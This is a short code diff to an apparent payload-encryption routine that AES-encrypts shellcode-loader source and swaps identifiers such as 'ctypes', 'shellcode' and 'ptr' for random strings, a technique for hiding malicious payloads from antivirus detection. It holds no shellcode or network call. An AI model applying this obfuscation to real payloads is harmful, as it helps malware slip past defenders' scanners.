@@ -22,12 +22,15 @@ def do_Encryption(payload):
 
     randdecrypt = randomJunk()
     randshellcode = randomJunk()
+    randbuf = randomJunk()
+    randptr = randomJunk()
+    randht = randomJunk()
 
     randctypes = randomJunk()
     randaes = randomJunk()
 
     encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
-    encrypted = encrypto.encrypt(payload.replace('ctypes',randctypes).replace('shellcode',randshellcode))
+    encrypted = encrypto.encrypt(payload.replace('ctypes',randctypes).replace('shellcode',randshellcode).replace('bufe', randbuf).replace('ptr', randptr).replace('ht',randht))
 
     newpayload = "# -*- coding: utf-8 -*- \n"
     newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
